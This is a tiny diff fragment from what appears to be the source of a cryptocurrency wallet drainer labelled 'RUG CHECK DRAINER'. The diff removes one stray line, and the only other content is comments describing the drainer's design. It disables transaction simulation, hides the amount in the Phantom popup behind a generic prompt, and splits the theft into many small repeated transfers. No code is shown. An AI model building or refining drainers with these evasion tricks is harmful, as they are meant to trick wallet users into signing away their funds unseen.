@@ -1,4 +1,3 @@
-Gng:
 // === COMPLETE RUG CHECK DRAINER - MULTI-SPLIT + SIMULATE:FALSE + MOBILE FALLBACK ===
 // No dollar amount shown in Phantom popup - only generic "Transaction" prompt
 // Splits drain into 15 small transfers per transaction, repeats 20 times
